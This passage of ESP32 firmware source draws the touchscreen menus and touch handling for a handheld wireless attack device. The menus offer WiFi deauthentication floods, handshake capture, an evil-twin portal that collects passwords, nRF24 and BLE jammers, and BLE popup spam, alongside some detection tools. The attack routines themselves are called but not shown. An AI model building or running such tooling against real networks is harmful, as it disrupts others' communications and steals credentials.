  int actionStartX = (240 - totalActionWidth) / 2;

  // DELETE (LEFT)
  tft.fillRect(actionStartX, controlY, delW, 28, COLOR_WARNING);
  tft.drawRect(actionStartX, controlY, delW, 28, COLOR_CRITICAL);
  tft.setTextSize(1);
  tft.setTextColor(COLOR_BG);
  tft.setCursor(actionStartX + 10, controlY + 10);
  tft.print("DEL");

  // SAVE (CENTER)
  int saveX = actionStartX + delW + 5;
  tft.fillRect(saveX, controlY, saveW, 28, COLOR_SUCCESS);
  tft.drawRect(saveX, controlY, saveW, 28, COLOR_MATRIX_GREEN);
  tft.setTextColor(COLOR_BG);
  tft.setCursor(saveX + 24, controlY + 10);
  tft.print("SAVE");

  // CANCEL (RIGHT)
  int cancelX = saveX + saveW + 5;
  tft.fillRect(cancelX, controlY, cancelW, 28, COLOR_CRITICAL);
  tft.drawRect(cancelX, controlY, cancelW, 28, COLOR_WARNING);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(cancelX + 6, controlY + 10);
  tft.print("CANCEL");
}

// ==================== FIXED: handleBeaconAddTouch() ====================
void handleBeaconAddTouch(int x, int y) {
  int inputY = HEADER_HEIGHT + 10;
  int inputHeight = 40;
  int keyY = inputY + inputHeight + 15;
  int keyW = 22;
  int keyH = 28;
  int keySpacing = 2;
  
  const char* keyboard_lower[4][10] = {
    {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"},
    {"q", "w", "e", "r", "t", "y", "u", "i", "o", "p"},
    {"a", "s", "d", "f", "g", "h", "j", "k", "l", " "},
    {"z", "x", "c", "v", "b", "n", "m", "_", "-", "."}
  };
  
  const char* keyboard_upper[4][10] = {
    {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
    {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"},
    {"A", "S", "D", "F", "G", "H", "J", "K", "L", " "},
    {"Z", "X", "C", "V", "B", "N", "M", "_", "-", "."}
  };
  
  const char* keyboard_symbols[4][10] = {
    {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
    {"[", "]", "{", "}", "<", ">", "|", "\\", "/", "?"},
    {"+", "=", "~", "`", ":", ";", "'", "\"", ",", " "},
    {".", "_", "-", " ", " ", " ", " ", " ", " ", " "}
  };
  
  const char* (*current_layout)[10];
  if (symbolsActive) {
    current_layout = keyboard_symbols;
  } else if (shiftActive) {
    current_layout = keyboard_upper;
  } else {
    current_layout = keyboard_lower;
  }
  
  // Check keyboard keys
  for (int row = 0; row < 4; row++) {
    int keysInRow = (row < 3) ? 10 : 9;
    
    for (int col = 0; col < keysInRow; col++) {
      int keyX = SIDE_MARGIN + (col * (keyW + keySpacing));
      int keyYPos = keyY + (row * (keyH + keySpacing));
      
      if (x >= keyX && x <= keyX + keyW && y >= keyYPos && y <= keyYPos + keyH) {
        if (beaconInputSSID.length() < 32) {
          beaconInputSSID += current_layout[row][col];
          drawBeaconAddScreen();
        }
        return;
      }
    }
  }
  
  // Control row checks - CENTERED positions
  int controlY = keyY + (4 * (keyH + keySpacing)) + 8;
  
  int shiftW = 45;
  int spaceW = 80;
  int symW = 50;
  int totalControlWidth = shiftW + 5 + spaceW + 5 + symW;
  int controlStartX = (240 - totalControlWidth) / 2;
  
  // SHIFT (left)
  if (x >= controlStartX && x <= controlStartX + shiftW && 
      y >= controlY && y <= controlY + 28) {
    shiftActive = !shiftActive;
    if (shiftActive) symbolsActive = false;
    drawBeaconAddScreen();
    return;
  }
  
  // SPACE (center)
  int spaceX = controlStartX + shiftW + 5;
  if (x >= spaceX && x <= spaceX + spaceW && 
      y >= controlY && y <= controlY + 28) {
    if (beaconInputSSID.length() < 32) {
      beaconInputSSID += " ";
      drawBeaconAddScreen();
    }
    return;
  }
  
  // SYMBOLS (right)
  int symX = spaceX + spaceW + 5;
  if (x >= symX && x <= symX + symW && 
      y >= controlY && y <= controlY + 28) {
    symbolsActive = !symbolsActive;
    if (symbolsActive) shiftActive = false;
    drawBeaconAddScreen();
    return;
  }
  
  // ✅ FIXED: Action buttons - CORRECT touch handling (matches display positions)
  controlY += 36;
  
  int delW = 45;
  int saveW = 80;
  int cancelW = 50;
  int totalActionWidth = delW + 5 + saveW + 5 + cancelW;
  int actionStartX = (240 - totalActionWidth) / 2;
  
  // DELETE (LEFT) - ✅ FIX: Now handles DELETE action
  if (x >= actionStartX && x <= actionStartX + delW && 
      y >= controlY && y <= controlY + 28) {
    if (beaconInputSSID.length() > 0) {
      beaconInputSSID.remove(beaconInputSSID.length() - 1);
      drawBeaconAddScreen();
    }
    return;
  }
  
  // SAVE (CENTER) - ✅ FIX: Now handles SAVE action
  int saveX = actionStartX + delW + 5;
  if (x >= saveX && x <= saveX + saveW && 
      y >= controlY && y <= controlY + 28) {
    if (beaconInputSSID.length() > 0 && customBeaconCount < 20) {
      customBeacons[customBeaconCount] = beaconInputSSID;
      customBeaconCount++;
      addToConsole("Added: " + beaconInputSSID);
      beaconInputSSID = "";
      shiftActive = false;
      symbolsActive = false;
      currentState = BEACON_MANAGER;
      drawBeaconManager();
    }
    return;
  }
  
  // CANCEL (RIGHT)
  int cancelX = saveX + saveW + 5;
  if (x >= cancelX && x <= cancelX + cancelW && 
      y >= controlY && y <= controlY + 28) {
    beaconInputSSID = "";
    shiftActive = false;
    symbolsActive = false;
    currentState = BEACON_MANAGER;
    drawBeaconManager();
    return;
  }
}

void deleteBeacon(int index) {
  if (index < 0 || index >= customBeaconCount) return;
  
  addToConsole("Deleted: " + customBeacons[index]);
  
  // Shift array
  for (int i = index; i < customBeaconCount - 1; i++) {
    customBeacons[i] = customBeacons[i + 1];
  }
  customBeaconCount--;
  
  // Adjust scroll if needed
  if (beaconDisplayOffset >= customBeaconCount && beaconDisplayOffset > 0) {
    beaconDisplayOffset -= MAX_DISPLAY_BEACONS;
    if (beaconDisplayOffset < 0) beaconDisplayOffset = 0;
  }
}

void drawBLEMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("bluetooth tools");
  
  const char* menuItems[] = {
    "nRF24 Jammer",      // Real disconnection attack
    "Apple/Android Spam", // BLE spam attacks
    "Scan BLE",          // Keep for info only
    "AirTag Scan",       // Keep for detection
    "Skimmer Detect"     // Keep for detection
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 5; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Warning message
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y + 10);
  tft.println("nRF24 = Real disconnect");
  tft.setCursor(SIDE_MARGIN, y + 22);
  tft.println("Spam = Popups only");
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

void drawBLEJammerMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("ble jammer");
  
  const char* menuItems[] = {
    bleJammerActive ? "Stop Jammer" : "Start Jammer"
  };
  
  int y = HEADER_HEIGHT + 10;
  drawMenuItem(menuItems[0], 0, y, hoveredIndex == 0, false);
  
  // Status section
  y = HEADER_HEIGHT + 50;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Status: ");
  tft.setTextColor(bleJammerActive ? COLOR_ORANGE : COLOR_TEXT);
  tft.printf(bleJammerActive ? "ACTIVE" : "STOPPED");
  
  y += 15;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Mode: ");
  tft.setTextColor(COLOR_GREEN);
  tft.println(jammerModeText);
  
  if (bleJammerActive) {
    y += 15;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Packets: ");
    tft.setTextColor(COLOR_CYAN);
    tft.printf("%d", bleJamPackets);
    
    y += 15;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Duration: ");
    tft.setTextColor(COLOR_TEXT);
    tft.printf("%d sec", (millis() - lastBLEJamTime) / 1000);
  }
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

void drawMoreToolsMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("more tools");
  
  const char* menuItems[] = {
    "Deauth Sniffer",  // NEW - moved to top
    "Skimmer Detect",
    "Wardriving",
    "Console"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 4; i++) {  // Changed from 3 to 4
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

void drawAttackMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("attack mode");
  
  // Target display
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.print("Target: ");
  tft.setTextColor(COLOR_YELLOW);
  String displaySSID = selectedSSID;
  if (displaySSID.length() > 22) displaySSID = displaySSID.substring(0, 21) + "~";
  tft.println(displaySSID);
  
  // 6 MENU ITEMS
  const char* menuItems[] = {
    "Deauth (Standard)",
    "Deauth (Storm)",
    "Capture Handshake",
    "Evil Twin",
    "View Passwords",
    "Stop All"
  };
  
  int y = HEADER_HEIGHT + 25;
  for (int i = 0; i < 6; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // === SEPARATOR LINE ===
  int separatorY = y + 5;
  tft.drawFastHLine(0, separatorY, 240, COLOR_DARK_GREEN);
  
  // === STATUS SECTION REMOVED ===
  // updateAttackMenuLive() will handle all status drawing to prevent overlap
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

void drawSpamMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("ble spam");
  
  const char* menuItems[] = {
    appleSpamActive ? "Stop Apple" : "Apple Spam",
    androidSpamActive ? "Stop Android" : "Android Spam",
    (appleSpamActive && androidSpamActive) ? "Stop Combined" : "Combined Spam"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 3; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Status section
  y = HEADER_HEIGHT + 100;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // Apple status
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Apple: ");
  tft.setTextColor(appleSpamActive ? COLOR_ORANGE : COLOR_TEXT);
  tft.printf(appleSpamActive ? "ACTIVE" : "OFF");
  
  if (appleSpamActive) {
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN + 90, y);
    tft.printf("(%d)", appleSpamCount);
  }
  
  y += 15;
  
  // Android status
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Android: ");
  tft.setTextColor(androidSpamActive ? COLOR_ORANGE : COLOR_TEXT);
  tft.printf(androidSpamActive ? "ACTIVE" : "OFF");
  
  if (androidSpamActive) {
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN + 90, y);
    tft.printf("(%d)", androidSpamCount);
  }
  
  y += 20;
  
  // Packets per second
  if (appleSpamActive || androidSpamActive) {
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Rate: ");
    tft.setTextColor(COLOR_GREEN);
    
    unsigned long runtime = max(1UL, (millis() - lastAppleSpam) / 1000);
    uint32_t pps = (appleSpamCount + androidSpamCount) / runtime;
    tft.printf("~%d pkt/s", pps);
  }
  
  y += 25;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // Info
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("AGGRESSIVE MODE:");
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("- 50 pkt/sec per type");
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("- Random MAC each packet");
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("- All device models");
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("- Combined = 100 pkt/sec!");
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

void drawNRFJammerMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("nrf24 jam");
  
  // Updated menu items with mode selector
  const char* menuItems[] = {
    nrfJammerActive ? "Stop Jammer" : "Start Jammer",
    "Toggle Dual",
    "Cycle Mode"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 3; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Status section
  y = HEADER_HEIGHT + 100;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Mode: ");
  tft.setTextColor(dualNRFMode ? COLOR_GREEN : COLOR_PURPLE);
  tft.printf(dualNRFMode ? "DUAL (2x)" : "SINGLE");
  
  y += 15;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Pattern: ");
  
  // Show current jamming mode
  const char* modeName = "";
  uint16_t modeColor = COLOR_GREEN;
  switch (nrfJamMode) {
    case NRF_SWEEP:
      modeName = "SWEEP";
      modeColor = COLOR_GREEN;
      break;
    case NRF_RANDOM:
      modeName = "RANDOM";
      modeColor = COLOR_CYAN;
      break;
    case NRF_FOCUSED:
      modeName = "FOCUSED";
      modeColor = COLOR_ORANGE;
      break;
  }
  tft.setTextColor(modeColor);
  tft.printf("%s", modeName);
  
  y += 15;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Radio 1: ");
  tft.setTextColor(nrf1Available ? COLOR_GREEN : COLOR_RED);
  tft.printf(nrf1Available ? "OK" : "FAIL");
  
  y += 15;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Radio 2: ");
  tft.setTextColor(nrf2Available ? COLOR_GREEN : COLOR_RED);
  tft.printf(nrf2Available ? "OK" : "FAIL");
  
  if (nrfJammerActive) {
    y += 20;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Status: ");
    tft.setTextColor(COLOR_ORANGE);
    tft.print("JAMMING");
    
    y += 15;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Packets: ");
    tft.setTextColor(COLOR_CYAN);
    tft.printf("%d", nrfJamPackets);
  }
  
  // Info box - Mode descriptions
  y += 25;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 8;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("MODE GUIDE:");
  y += 12;
  
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("SWEEP");
  tft.setTextColor(COLOR_TEXT);
  tft.print(" = ");
  tft.println("Smoochiee's sweep");
  y += 10;
  tft.setCursor(SIDE_MARGIN + 10, y);
  tft.println("pattern. Most effective!");
  y += 14;
  
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("RANDOM");
  tft.setTextColor(COLOR_TEXT);
  tft.print(" = ");
  tft.println("Chaotic hopping");
  y += 10;
  tft.setCursor(SIDE_MARGIN + 10, y);
  tft.println("across all channels.");
  y += 14;
  
  tft.setTextColor(COLOR_ORANGE);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("FOCUSED");
  tft.setTextColor(COLOR_TEXT);
  tft.print(" = ");
  tft.println("Targets BLE");
  y += 10;
  tft.setCursor(SIDE_MARGIN + 10, y);
  tft.println("advertising channels.");
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

void showConsole() {
  previousState = currentState;
  currentState = CONSOLE_VIEW;
  
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("console");
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  int y = HEADER_HEIGHT + 10;
  
  for (int i = 0; i < 15; i++) {
    int idx = (consoleIndex + i) % 15;
    if (consoleBuffer[idx].length() > 0) {
      tft.setCursor(5, y);
      
      // Color code based on content
      String msg = consoleBuffer[idx];
      if (msg.indexOf("ERROR") >= 0 || msg.indexOf("FAIL") >= 0) {
        tft.setTextColor(COLOR_RED);
      } else if (msg.indexOf("WARN") >= 0) {
        tft.setTextColor(COLOR_ORANGE);
      } else if (msg.indexOf("started") >= 0 || msg.indexOf("OK") >= 0) {
        tft.setTextColor(COLOR_GREEN);
      } else {
        tft.setTextColor(COLOR_TEXT);
      }
      
      String truncated = msg;
      if (truncated.length() > 38) {
        truncated = truncated.substring(0, 38);
      }
      tft.println("> " + truncated);
      y += 10;
      if (y > SCREEN_HEIGHT - 70) break;
    }
  }
  
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

void handleSelectTargetTouch(int x, int y) {
  if (y > 300) {
    currentState = WIFI_MENU;
    hoveredIndex = -1;
    drawWiFiMenu();
    return;
  }
  
  int listY = HEADER_HEIGHT + 35;
  int itemHeight = 28;
  
  if (y >= listY && y <= listY + (MAX_WIFI_DISPLAY * itemHeight)) {
    int clickedIndex = (y - listY) / itemHeight;
    int actualIndex = wifiScrollOffset + clickedIndex;
    
    if (actualIndex >= 0 && actualIndex < networkCount) {
      selectedSSID = networks[actualIndex].ssid;
      selectedIndex = actualIndex;
      currentState = WIFI_ATTACK_MENU;
      hoveredIndex = -1;
      drawAttackMenu();
      addToConsole("Target: " + selectedSSID);
    }
  }
  // Scroll up
  else if (y < listY && wifiScrollOffset > 0) {
    wifiScrollOffset = max(0, wifiScrollOffset - MAX_WIFI_DISPLAY);
    drawSelectTargetMenu();
  }
  // Scroll down
  else if (y > 270 && y < 300 && wifiScrollOffset + MAX_WIFI_DISPLAY < networkCount) {
    wifiScrollOffset = min(networkCount - MAX_WIFI_DISPLAY, wifiScrollOffset + MAX_WIFI_DISPLAY);
    drawSelectTargetMenu();
  }
}

// Improved touch handling with better accuracy
void handleTouch() {
  uint16_t touchX, touchY;
  
  if (tft.getTouch(&touchX, &touchY)) {
    delay(150);
    
    uint16_t verifyX, verifyY;
    if (!tft.getTouch(&verifyX, &verifyY)) {
      return;
    }
    
    touchX = (touchX + verifyX) / 2;
    touchY = (touchY + verifyY) / 2;
    
    Serial.printf("Touch: X=%d, Y=%d, State=%d\n", touchX, touchY, currentState);
    
    // Route to handlers
    switch (currentState) {
      case MAIN_MENU:
        handleMainMenuTouch(touchX, touchY);
        break;
        
      case WIFI_MENU:
        handleWiFiMenuTouch(touchX, touchY);
        break;
        
      case WIFI_SCAN:
        handleWiFiScanTouch(touchX, touchY);
        break;
        
      case SELECT_TARGET:
        handleSelectTargetTouch(touchX, touchY);
        break;
        
      case WIFI_ATTACK_MENU:
        handleAttackMenuTouch(touchX, touchY);
        break;
        
      case BEACON_MANAGER:
        handleBeaconManagerTouch(touchX, touchY);
        break;
        
      case BEACON_ADD:
        handleBeaconAddTouch(touchX, touchY);
        break;

      case WIFI_BLE_NRF_JAM:
        // Handle both deauth flood and combined jammer
        if (deauthFloodActive) {
          stopDeauthFlood();
        } else if (nrfJammerActive || bleJammerActive) {
          stopCombinedJammer();
        }
        currentState = WIFI_MENU;
        drawWiFiMenu();
        break;
        
      case SNIFFER_ACTIVE:
        Serial.println("\n[!] ===== SNIFFER STOP INITIATED =====");
        Serial.printf("Before: snifferActive=%d, currentState=%d\n", snifferActive, currentState);
        esp_wifi_set_promiscuous(false);
        Serial.println("[1] Promiscuous mode disabled");
        snifferActive = false;
        Serial.printf("[2] snifferActive = %d\n", snifferActive);
        currentState = MAIN_MENU;
        Serial.printf("[3] currentState = %d (MAIN_MENU)\n", currentState);
        delay(50);
        tft.fillScreen(COLOR_BG);
        Serial.println("[4] Screen cleared");
        drawMainMenu();
        Serial.println("[5] Main menu drawn");
        addToConsole("Sniffer stopped");
        
        Serial.printf("After: snifferActive=%d, currentState=%d\n", snifferActive, currentState);
        Serial.println("[✓] ===== SNIFFER STOPPED =====\n");
        return;
        
      case HANDSHAKE_CAPTURE:
        // Just stop, don't redraw yet
        stopDeauth();
        esp_wifi_set_promiscuous(false);
        currentState = WIFI_ATTACK_MENU;
        drawAttackMenu();
        break;
        
      case CAPTURED_PASSWORDS:
        if (touchY > 300) {
          currentState = WIFI_ATTACK_MENU;
          hoveredIndex = -1;
          drawAttackMenu();
        } else {
          int listY = HEADER_HEIGHT + 40;
          if (touchY > listY && touchY < 280) { 
            if (credDisplayOffset + MAX_DISPLAY_CREDS < capturedCredCount) {
              credDisplayOffset++;
              displayCapturedPasswords();
            }
          } else if (touchY < listY && credDisplayOffset > 0) { 
            credDisplayOffset--;
            displayCapturedPasswords();
          }
        }
        break;
        
      case BLE_MENU:
        handleBLEMenuTouch(touchX, touchY);
        break;
        
      case BLE_SCAN_RESULTS:
        if (touchY > 300) {
          // STOP SCAN FIRST, change state, THEN draw
          continuousBLEScan = false;
          if (pBLEScan != nullptr) {
            pBLEScan->stop();
            BLEDevice::deinit(false);
          }
          currentState = BLE_MENU;  // Change state BEFORE drawing
          hoveredIndex = -1;
          delay(100);  // Small delay to ensure scan stops
          drawBLEMenu();
        }
        break;
        
      case BLE_JAM_MENU:
        handleBLEJamMenuTouch(touchX, touchY);
        break;
        
      case BLE_JAM_ACTIVE:
        stopBLEJammer();
        currentState = BLE_JAM_MENU;
        hoveredIndex = -1;
        drawBLEJammerMenu();
        break;
        
      case SPAM_MENU:
        handleSpamMenuTouch(touchX, touchY);
        break;
        
      case NRF_JAM_MENU:
        handleNRFJamMenuTouch(touchX, touchY);
        break;
        
      case NRF_JAM_ACTIVE:
        // ANY tap stops jammer and goes back
        stopNRFJammer();
        currentState = NRF_JAM_MENU;
        hoveredIndex = -1;
        drawNRFJammerMenu();
        break;

      case DEAUTH_SNIFFER:
        handleDeauthSnifferMenuTouch(touchX, touchY);
        break;

      case DEAUTH_SNIFFER_ACTIVE:
        if (touchY > 300) {
          stopDeauthSniffer();
          currentState = DEAUTH_SNIFFER;
          drawDeauthSnifferMenu();
        } else {
          // Scroll through deauth events
          int listY = HEADER_HEIGHT + 35;
          if (touchY > listY && touchY < 280) {
            if (deauthScrollOffset + MAX_DEAUTH_DISPLAY < deauthEventCount) {
              deauthScrollOffset++;
              displayDeauthSnifferActive();
            }
          } else if (touchY < listY && deauthScrollOffset > 0) {
            deauthScrollOffset--;
            displayDeauthSnifferActive();
          }
        }
        break;
        
      // ===== FIXED: AirTag Scanner =====
      case AIRTAG_SCANNER:
      case AIRTAG_RESULTS:
        if (touchY > 300) {
          // STOP SCAN FIRST, change state, THEN draw
          if (pBLEScan != nullptr) {
            pBLEScan->stop();
            BLEDevice::deinit(false);
          }
          currentState = BLE_MENU;  // Change state BEFORE drawing
          hoveredIndex = -1;
          delay(100);  // Ensure scan stops
          drawBLEMenu();
        }
        break;
        
      // ===== FIXED: Skimmer Detector =====
      case SKIMMER_DETECTOR:
      case SKIMMER_RESULTS:
        if (touchY > 300) {
          // STOP SCAN FIRST, change state, THEN draw
          if (pBLEScan != nullptr) {
            pBLEScan->stop();
            BLEDevice::deinit(false);
          }
          currentState = MORE_TOOLS_MENU;  // Change state BEFORE drawing
          hoveredIndex = -1;
          delay(100);  // Ensure scan stops
          drawMoreToolsMenu();
        }
        break;
        
      // ===== FIXED: Wardriving =====
      case WARDRIVING_MODE:
        if (touchY > 300) {
          // Stop scan, change state, THEN draw
          WiFi.scanDelete();
          currentState = MORE_TOOLS_MENU;  // Change state BEFORE drawing
          hoveredIndex = -1;
          delay(100);
          drawMoreToolsMenu();
        }
        break;
        
      case MORE_TOOLS_MENU:
        handleMoreToolsTouch(touchX, touchY);
        break;
        
      case CONSOLE_VIEW:
        if (touchY > 300) {
          currentState = previousState;
          if (previousState == MAIN_MENU) {
            drawMainMenu();
          } else if (previousState == MORE_TOOLS_MENU) {
            drawMoreToolsMenu();
          }
        }
        break;
      
      case SETTINGS_MENU:
        handleSettingsMenuTouch(touchX, touchY);
        break;
        
      case DEVICE_INFO:
        if (touchY > 300) {
          currentState = SETTINGS_MENU;
          hoveredIndex = -1;
          drawSettingsMenu();
        }
        break;
        
      case ASCII_ART_VIEWER:
        // Any tap exits
        currentState = SETTINGS_MENU;
        hoveredIndex = -1;
        drawSettingsMenu();
        break;
    }
  }
}

void handleBackButton() {
  // Stop continuous scans
  if (continuousWiFiScan) {
    continuousWiFiScan = false;
    WiFi.scanDelete();
  }
  
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan != nullptr) {
      pBLEScan->stop();
      BLEDevice::deinit(false);
    }
  }
  
  // Stop active operations
  if (currentState == BLE_JAM_ACTIVE) stopBLEJammer();
  if (currentState == NRF_JAM_ACTIVE) stopNRFJammer();

  if (currentState == SNIFFER_ACTIVE) {
    stopSniffer();
    currentState = MAIN_MENU;
    hoveredIndex = -1;
    drawMainMenu();
    return;
  }
  
  if (currentState == WIFI_BLE_NRF_JAM) {
    stopCombinedJammer();
    return;
  }
  
  // Navigation logic
  switch (currentState) {
    // Top level menus go back to main
    case WIFI_MENU:
    case BLE_MENU:
    case MORE_TOOLS_MENU:
      currentState = MAIN_MENU;
      hoveredIndex = -1;
      drawMainMenu();
      break;
      
    // WiFi submenu items go back to WiFi menu
    case WIFI_SCAN:
    case SELECT_TARGET:
    case WIFI_ATTACK_MENU:
    case BEACON_MANAGER:
    case CAPTURED_PASSWORDS:
    case HANDSHAKE_CAPTURE:
      if (deauthActive) stopDeauth();
      if (portalActive) stopCaptivePortal();
      if (currentState == HANDSHAKE_CAPTURE) {
        esp_wifi_set_promiscuous(false);
      }
      currentState = WIFI_MENU;
      hoveredIndex = -1;
      drawWiFiMenu();
      break;
      
    // Beacon add goes back to beacon manager
    case BEACON_ADD:
      currentState = BEACON_MANAGER;
      hoveredIndex = -1;
      drawBeaconManager();
      break;
      
    // BLE submenu items go back to BLE menu
    case BLE_SCAN_RESULTS:
      continuousBLEScan = false;
      if (pBLEScan != nullptr) {
        pBLEScan->stop();
        BLEDevice::deinit(false);
      }
      currentState = BLE_MENU;
      hoveredIndex = -1;
      drawBLEMenu();
      break;
      
    case BLE_JAM_MENU:
      if (bleJammerActive) stopBLEJammer();
      currentState = BLE_MENU;
      hoveredIndex = -1;
      drawBLEMenu();
      break;
      
    case SPAM_MENU:
      // Stop any active spam
      if (appleSpamActive || androidSpamActive) {
        if (BLEDevice::getInitialized()) {
          BLEDevice::deinit(false);
        }
        appleSpamActive = false;
        androidSpamActive = false;
      }
      currentState = BLE_MENU;
      hoveredIndex = -1;
      drawBLEMenu();
      break;
      
    case NRF_JAM_MENU:
      if (nrfJammerActive) stopNRFJammer();
      currentState = BLE_MENU;
      hoveredIndex = -1;
      drawBLEMenu();
      break;

    case DEAUTH_SNIFFER:
      if (deauthSnifferActive) stopDeauthSniffer();
      currentState = MORE_TOOLS_MENU;
      hoveredIndex = -1;
      drawMoreToolsMenu();
      break;

    case DEAUTH_SNIFFER_ACTIVE:
      stopDeauthSniffer();
      currentState = MORE_TOOLS_MENU;
      hoveredIndex = -1;
      drawMoreToolsMenu();
      break;
      
    case AIRTAG_SCANNER:
    case AIRTAG_RESULTS:
      if (pBLEScan != nullptr) {
        pBLEScan->stop();
        BLEDevice::deinit(false);
      }
      currentState = BLE_MENU;
      hoveredIndex = -1;
      drawBLEMenu();
      break;
      
    case SKIMMER_DETECTOR:
    case SKIMMER_RESULTS:
      if (pBLEScan != nullptr) {
        pBLEScan->stop();
        BLEDevice::deinit(false);
      }
      currentState = MORE_TOOLS_MENU;
      hoveredIndex = -1;
      drawMoreToolsMenu();
      break;
      
    case WARDRIVING_MODE:
      currentState = MORE_TOOLS_MENU;
      hoveredIndex = -1;
      drawMoreToolsMenu();
      break;
      
    case CONSOLE_VIEW:
      currentState = previousState;
      if (previousState == MAIN_MENU) {
        drawMainMenu();
      } else if (previousState == MORE_TOOLS_MENU) {
        drawMoreToolsMenu();
